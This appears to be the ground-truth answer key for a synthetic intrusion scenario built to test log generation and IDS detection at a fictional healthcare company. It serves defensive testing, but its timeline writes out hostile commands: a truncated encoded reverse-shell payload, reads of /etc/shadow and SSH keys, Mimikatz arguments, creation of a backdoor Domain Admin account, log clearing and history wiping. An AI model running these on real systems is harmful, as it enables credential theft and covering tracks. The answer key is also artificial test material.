# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:12:15 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:15 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CGFo0VLQIlqYrJSFAA) |
| 2024-03-18 12:24:29 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:22 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:22 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:13 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (389 requests) |
| 2024-03-18 12:45:12 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:47:45 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:16 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CINKY9dHTmNjLmQtq) |
| 2024-03-18 13:00:00 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C9dVf2EOore2d33nFw) |
| 2024-03-18 13:00:11 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CIu9sBFbxrMEKB2Cra) |
| 2024-03-18 13:20:20 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C5QQ2X3DD506ysbiOG) |
| 2024-03-18 13:20:21 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581471) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:22 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CzXo2HWT5uiSEQt3v0V) |
| 2024-03-18 13:20:23 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:52 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584325) - `ip addr show` |
| 2024-03-18 13:40:00 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584352) - `cat /etc/hosts` |
| 2024-03-18 13:40:08 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584488) - `cat /etc/resolv.conf` |
| 2024-03-18 13:41:10 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584521) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:41:21 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584634) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:42:14 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584664) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:49:35 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:55 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:55 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587132) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:57 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587218) - `ls -la /root/.ssh` |
| 2024-03-18 14:00:51 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587342) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:39 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CCuuFOmnneynbWpBb) |
| 2024-03-18 14:14:41 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CDGVXLGtcepDh8Clz) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:35:18 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962172) - `cat /etc/passwd` |
| 2024-03-18 14:35:23 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962201) - `cat /etc/shadow` |
| 2024-03-18 14:49:54 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:23 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:46 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:48 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CTxzqQ9C7v5RN9k8Ef) |
| 2024-03-18 15:08:04 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:29 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: CugkPemweF7Kwt5od3d) |
| 2024-03-18 15:20:11 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x270100d) |
| 2024-03-18 15:20:13 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6472) - `whoami /all` |
| 2024-03-18 15:20:14 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6476) - `net user /domain` |
| 2024-03-18 15:20:14 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6496) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:16 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6500) - `net view /domain` |
| 2024-03-18 15:20:17 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CzP4UGBXkeXkJKJWXv) |
| 2024-03-18 15:45:29 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6604) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:29 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:31 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:42 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5553148) |
| 2024-03-18 15:59:43 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5472) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:43 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:44 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5480) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:19 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:35 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:35 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5504) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:38 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5516) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:14:40 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:23 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5572) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:24 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:25 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5584) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:26 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:30:06 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:30:33 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:57 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 301 queries, 1559 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=300 emitted=6 filtered=294] |
| 2024-03-18 16:50:25 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:13 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:01:22 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf885c9e) |
| 2024-03-18 17:01:24 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5648) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:25 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5652) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:55 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158480) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:14:55 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CGl03UeWDhZ9rRroxu7) |
| 2024-03-18 17:17:15 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 158807) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:18:56 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159325) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:19:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:24:56 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: CD513QpuOsom9oiLVy) |
| 2024-03-18 17:30:27 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:34:39 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:02 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608785) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:31 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982805) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:42:04 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5840) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:16 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5856) - `wevtutil cl Security` |
| 2024-03-18 17:42:18 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:16 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:19 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:20 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:14 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5876) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:16 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:37 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:28 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:09 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 0029fb58-18e1-4293-9f02-915ce81c6bbb | ids | delayed: 1 |
| 00829f8d-a45f-4251-a0b0-68fc5072e91a | ids | delayed: 1 |
| 00cd882c-e3b3-40e4-840d-833cf3eb677a | ids | delayed: 1 |
| 015ca921-fb85-4525-ab85-7cc8a72ddf43 | ids | delayed: 1 |
| 0262d39d-755b-4dae-8e79-66a2a2b42e37 | ids | delayed: 1 |
| 031ed1ec-570f-4eef-ac16-dbdedae796dd | ids | delayed: 1 |
| 03f03bde-0e71-4f6f-a6ea-76c2131e4830 | ids | delayed: 1 |
| 03f94602-fff2-4f9a-80ef-b27e95c25c39 | ids | delayed: 1 |
| 04809c3d-04d5-402e-a119-78f1b0ce46f0 | ids | delayed: 1 |
| 0496b63b-897b-476a-8bfd-b105e44ce05e | ids | delayed: 1 |
| 0650629a-f668-4352-bc35-55e96ee3b1fa | ids | delayed: 1 |
| 080992c2-2fed-41ad-b561-069a411556ce | ids | visible: 1 |
| 09fa1754-c53d-4798-8cbc-d05c3400ab5f | ids | visible: 1 |
| 0af0d3db-454d-4e08-9bfe-d3d400181bb5 | ids | delayed: 1 |
| 0d6aabed-cfb0-4e73-8a45-271548b0eefe | ids | delayed: 1 |
| 0dc4ee60-7edc-4686-b9bf-e8affd104856 | ids | delayed: 2 |
| 0fb83f49-59b8-44b9-b860-d68d92c597cf | ids | delayed: 2 |
| 1141e60a-90df-4826-ad06-06646b907482 | ids | delayed: 1 |
| 1216cec4-74ed-4752-bb35-250aa0ca62e1 | ids | delayed: 1 |
| 135c92b7-a236-480d-8c5a-482bca70680c | ids | delayed: 1 |
| 137526f4-731d-407f-b3a3-cc7d86206ada | ids | delayed: 1 |
| 1a0e19dc-d6ba-4040-8b35-69f71d012199 | ids | delayed: 1 |
| 1a3163b5-d1ea-442d-a804-bdd44e8dca96 | ids | delayed: 1 |
| 1b9cf177-b624-4f1c-8081-048bbe0ed845 | ids | delayed: 1 |
| 1e3c9c11-f2f0-4387-adaf-bae630d04abc | ids | delayed: 1 |
| 1fd6449d-69c6-4242-96fd-21f4609a992b | ids | delayed: 2 |
| 20472d1a-dc8d-493a-af1e-4fa6a55f61d6 | ids | delayed: 1 |
| 22d1e64b-f49e-46c6-8b4f-4aed5c86fa4f | ids | delayed: 1 |
| 23aa3cca-7630-492d-a9fb-d813fadff6f9 | ids | delayed: 2 |
| 24f072cd-2165-4a16-a24f-4bb4dfce7ed2 | ids | delayed: 1 |
| 2a1fcf08-11ef-4243-b111-b61c280ff285 | ids | visible: 1 |
| 2b3fa3e4-cc3f-4d61-883d-edde06c04eeb | ids | delayed: 2 |
| 2b5c33aa-ad6d-4f7e-803a-ddb4bcc6e7b9 | ids | delayed: 1 |
| 2dc93f7e-97a3-4adb-8fc8-2215f0af303e | ids | delayed: 1 |
| 32765041-8baa-4f04-b3c2-a12d88531df1 | ids | delayed: 1 |
| 335cd32b-c311-4ade-9d51-e067763c9873 | ids | delayed: 1 |
| 35c486d4-74c8-48d4-b00c-322e7dfc3b15 | ids | delayed: 1 |
| 3941a716-bca5-4177-a6c5-a5a1b9d81481 | ids | delayed: 1 |
| 3c0d4501-d16a-44d9-b3d1-0840a0de1390 | ids | delayed: 1 |
| 3d5f5b9b-555e-4514-ab9f-d4395954fc93 | ids | delayed: 2 |
| 3dc673ab-5541-4ab0-90a7-bb5ea9026eb1 | ids | delayed: 2 |
| 3e803fe3-611c-4f50-a644-5a04c7a1b3d9 | ids | delayed: 1 |
| 41ae85e4-80ea-4600-8140-364c4a70914d | ids | delayed: 2 |
| 443c7171-05df-4676-b101-c125f72756a0 | ids | delayed: 2 |
| 44e7e0c2-0109-4827-89a2-d929e478037e | ids | delayed: 1 |
| 47dfaabb-dff9-4137-8f8c-125a21f00939 | ids | delayed: 1 |
| 4a395613-a560-40e6-a30b-841fd8a434ca | ids | delayed: 1 |
| 4aaccc58-b435-40e8-a741-82425d58abe9 | ids | delayed: 1 |
| 4d6d696e-d4e3-443b-bbe5-6c64ceeb624f | ids | delayed: 1 |
| 4e098677-d485-4080-9bfa-d0017f03b440 | ids | delayed: 1 |
| 4fdc5005-92e6-4278-9533-eecc17190ce7 | ids | delayed: 1 |
| 53650b04-0486-4fb0-9016-7e036312861c | ids | delayed: 1 |
| 54048fff-add3-49fa-a8e8-9a9d71054ee8 | ids | delayed: 1 |
| 56a3bd80-779b-4369-b762-4d993533c8d2 | ids | delayed: 1 |
| 57924bba-4b50-43c1-8e6a-d6792ad680b4 | ids | delayed: 2 |
| 586eaec4-1942-45ab-a1cf-8a93c2e569b0 | ids | delayed: 2 |
| 5890ee58-b9f1-4139-b561-319bc80528b0 | ids | delayed: 1 |
| 5ca2ce9d-f7a0-4266-96cc-e7a6a7a47d33 | ids | delayed: 2 |
| 5d7a5cc5-21af-4ffc-9153-72019cb7b681 | ids | delayed: 1 |
| 607dabde-2a29-4c50-a375-110dbb1b8d72 | ids | delayed: 1 |
| 61ac3b5e-b309-48b1-9056-e37265958e42 | ids | delayed: 1 |
| 649a95e9-2f8e-415e-8163-442e487c56a9 | ids | delayed: 2 |
| 6aa9bf32-4467-4da5-b9f7-4d392b82e4ff | ids | delayed: 1 |
| 6bad1472-b152-4511-91ec-28d96695562b | ids | delayed: 1 |
| 6d75cfc8-7f0e-4aed-9cc2-6b5352f2578f | ids | delayed: 1 |
| 6fd78b8e-b24e-4219-b518-3a26e7de3865 | ids | delayed: 2 |
| 6fe43c12-0e9b-44ac-81d3-476d091d9fb7 | ids | delayed: 2 |
| 7036380e-a199-4c2f-9938-845e459883c5 | ids | delayed: 2 |
| 71b34f56-b315-4189-84f8-e4488a522fbe | ids | delayed: 1 |
| 73453e7a-456d-4846-9225-fd7b20f3b78f | ids | delayed: 1 |
| 73530284-aca0-42bf-b559-0cdafa4d3f91 | ids | delayed: 2 |
| 7438e17b-eed8-442c-aac4-d33d6810fae7 | ids | delayed: 1 |
| 759a1cb4-a654-45f1-95ea-73d7d8032066 | ids | delayed: 1 |
| 765a74a7-b663-4a34-8dc7-e8807335871e | ids | delayed: 1 |
| 765d1b30-2128-47bc-b96b-ef81f549f265 | ids | delayed: 1 |
| 783a6027-8d00-40b3-9146-3da28b2db3da | ids | delayed: 1 |
| 78bfdc86-1015-472f-b67c-d52b4f4a1797 | ids | delayed: 1 |
| 7cbd0251-c04e-4adf-9961-74be06f98b05 | ids | delayed: 1 |
| 7ede88d4-4251-4aab-b6e1-772b88a704f6 | ids | delayed: 1 |
| 7eeb71f9-c484-4a50-9e7d-369809a661f4 | ids | delayed: 1 |
| 81c8c522-f85f-432a-bd83-e914733ea4ef | ids | delayed: 1 |
| 821e9b9d-4b3c-4ac9-aa7d-2a476bbab768 | ids | delayed: 2 |
| 83d71b9c-ecd8-4ba8-891a-34ad1e93c902 | ids | delayed: 1 |
| 86736e8f-a05e-495a-95e4-63dde580c2c8 | ids | delayed: 2 |
| 8c5e99e9-f7a1-46f2-a7c4-ade7fbf8058d | ids | delayed: 1 |
| 908cb65e-0cb3-4046-9c11-7119df41ffb5 | ids | delayed: 1 |
| 909d1419-1846-40e2-9731-559f32acae72 | ids | delayed: 1 |
| 90c83ff1-f31c-4058-8ee5-aa994490438f | ids | delayed: 1 |
| 911d6561-daba-4a0c-8e61-7899295ad6d1 | ids | delayed: 1 |
| 962933d7-b488-4cc3-b64c-21f6f4d58ebb | ids | delayed: 2 |
| 966d44c1-3c0e-4123-908c-ead90ab65673 | ids | delayed: 1 |
| 980e39c6-37f2-448b-8efa-1cd793595557 | ids | delayed: 1 |
| 9b129889-e6ca-4b0e-a38c-a23ee4125ef1 | ids | delayed: 1 |
| 9c5aef5d-7405-4824-9c1e-84233ba8102e | ids | delayed: 1 |
| 9eb3e885-ab04-4d89-81b2-df61f7e82ef3 | ids | delayed: 2 |
| 9fecfc00-4039-4af3-8780-6efc4ace933c | ids | delayed: 1 |
| a0cefc6f-4c7a-4e09-8afb-2012c2e18255 | ids | delayed: 1 |
| a0ea34cf-71d9-4342-9d13-91a9a3f1dbb4 | ids | delayed: 1 |
| a26278cc-b615-4420-8e45-204466181608 | ids | delayed: 2 |
| a291a857-4b85-45c5-a6cf-39d0a51398eb | ids | delayed: 1 |
| a333d978-e2e5-44ae-b147-9db49d096475 | ids | delayed: 1 |
| a9e52292-b660-4555-9453-7ee4ea235fb9 | ids | delayed: 1 |
| abdf461a-6618-47b8-87c7-9bd4e06de9d9 | ids | delayed: 1 |
| ac94f223-0dbe-4fa2-ba3c-baacc931ae42 | ids | delayed: 1 |
| aef63d6d-a26b-444a-be00-b1b6a7333b15 | ids | delayed: 1 |
| af45eaab-10a3-4d74-96ad-394dab607b44 | ids | delayed: 1 |
| b41c8d33-1bde-4d53-a648-cd73fb281be2 | ids | delayed: 1 |
| b8196d91-b9b6-40ed-98de-bbe5ad7a8789 | ids | delayed: 2 |
| bd2db8ed-c3e0-4c84-b985-2db41b873c11 | ids | delayed: 1 |
